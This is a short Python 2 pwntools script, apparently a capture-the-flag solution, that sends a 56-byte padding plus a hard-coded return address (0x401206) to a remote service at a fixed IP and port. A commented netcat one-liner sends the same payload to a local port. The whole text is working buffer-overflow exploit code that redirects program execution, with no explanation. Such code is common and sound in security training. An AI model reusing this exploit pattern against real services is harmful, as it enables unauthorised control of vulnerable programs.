#ghidra+gdb

#python -c "print 'A'*(48+8)+'\x06\x12\x40\x00'"|nc 127.0.0.1 1234

from pwn import *

io = remote('178.128.160.242',32493)
#io = remote('127.0.0.1',1234)
buf = 'A'*(48+8)+'\x06\x12\x40\x00'
io.sendline(buf)
print io.recvline()
print io.recvline()
print io.recvline()
print io.recvline()
print io.recvline()
print io.recvline()
